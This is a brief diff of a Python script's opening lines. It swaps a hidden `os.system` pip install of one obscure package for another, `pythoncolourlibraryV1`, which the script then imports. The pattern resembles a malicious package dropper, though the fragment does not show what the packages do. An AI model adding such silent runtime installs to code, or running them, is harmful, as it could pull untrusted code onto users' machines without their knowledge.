@@ -1,6 +1,6 @@
 import os
-os.system("pip install pyfontslibraryV1")
-import pyfontslibraryV1
+os.system("pip install pythoncolourlibraryV1")
+import pythoncolourlibraryV1
 from optparse import Option
 import requests
 import threading
